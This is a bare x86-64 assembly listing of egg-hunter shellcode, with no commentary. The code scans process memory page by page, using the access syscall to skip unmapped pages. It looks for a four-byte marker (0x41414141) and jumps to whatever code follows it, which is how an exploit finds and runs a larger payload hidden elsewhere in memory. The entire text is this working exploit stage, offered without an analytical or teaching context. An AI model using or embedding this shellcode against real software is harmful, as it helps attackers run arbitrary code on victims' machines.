global _start


_start:
    xor rsi, rsi
    jmp getpc

pop:
    pop rdi
    xor di, di
    jmp next

getpc:
    call pop

next:
    or di, 0xfff
    inc rdi

hunt:
    push 21
    pop rax
    syscall
    cmp al, 0xf2
    je next
    mov eax, 0x41414140
    inc al
    scasd
    jnz hunt
    jmp rdi
